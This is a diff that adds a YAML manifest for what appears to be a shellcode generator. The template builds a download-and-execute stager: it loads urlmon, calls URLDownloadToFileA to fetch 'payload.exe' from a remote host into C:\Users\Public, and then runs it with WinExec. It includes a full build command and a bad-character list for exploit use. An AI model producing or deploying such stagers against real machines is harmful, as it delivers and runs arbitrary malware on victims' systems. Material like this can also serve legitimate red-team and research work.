@@ -1,0 +1,10 @@
+# URLDownloadToFileA single-call download + WinExec
+# IR workflow: LoadLibraryA(urlmon) -> URLDownloadToFileA -> WinExec -> exit
+#
+# Build:
+#   uv run emitrion emitrion/manifests/url_download.yaml \
+#       --url "http://192.168.1.10/payload.exe" \
+#       --dst "C:\Users\Public\payload.exe" \
+#       --no-assemble --out emitter_out/
+template: ir_url_download
+badchars: ["00", "0A", "0D"]
